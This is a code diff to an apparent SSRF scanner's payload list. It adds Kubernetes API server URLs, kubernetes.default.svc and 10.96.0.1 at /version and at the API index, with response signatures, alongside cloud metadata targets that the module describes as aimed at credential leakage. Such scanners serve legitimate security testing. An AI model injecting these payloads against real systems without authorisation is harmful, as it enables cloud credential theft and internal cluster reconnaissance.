@@ -5,7 +5,10 @@ sibling for a *full-read* SSRF (the app reflects the fetched content). It inject
 each cloud provider's instance-metadata URL into a parameter and scans the response
 for that provider's credential signature — the Capital One pattern. Targets cover
 AWS / GCP / Azure / Alibaba / Yandex / Oracle / DigitalOcean, each with the exact
-host + required header + credential path.
+host + required header + credential path, **plus the Kubernetes API server** —
+a full-read SSRF from inside a pod reaches ``kubernetes.default.svc`` / the default
+ClusterIP and reflects an identifiable ``/version`` (``gitVersion``) or API-index
+(``"paths"``) body, confirming cluster-internal reach.
 
 Caveat: providers that require a request header (GCP ``Metadata-Flavor``, Azure
 ``Metadata``, Oracle ``Authorization``) only leak if the *vulnerable* server
@@ -47,6 +50,17 @@ CLOUD_METADATA_TARGETS: list[dict] = [
     {"provider": "DigitalOcean", "header": None,
      "url": "http://169.254.169.254/metadata/v1.json",
      "signatures": ["droplet_id", "interfaces", "region"]},
+    # --- Kubernetes cluster-internal (full-read SSRF from a pod reaches the API
+    # server, which reflects an identifiable JSON body). ---
+    {"provider": "Kubernetes API server (kube-dns /version)", "header": None,
+     "url": "https://kubernetes.default.svc/version",
+     "signatures": ["gitVersion", "goVersion", "buildDate"]},
+    {"provider": "Kubernetes API server (default ClusterIP /version)", "header": None,
+     "url": "https://10.96.0.1/version",
+     "signatures": ["gitVersion", "goVersion", "buildDate"]},
+    {"provider": "Kubernetes API server (API index)", "header": None,
+     "url": "https://kubernetes.default.svc/",
+     "signatures": ['"paths"', "/apis", "/healthz"]},
 ]
 
 
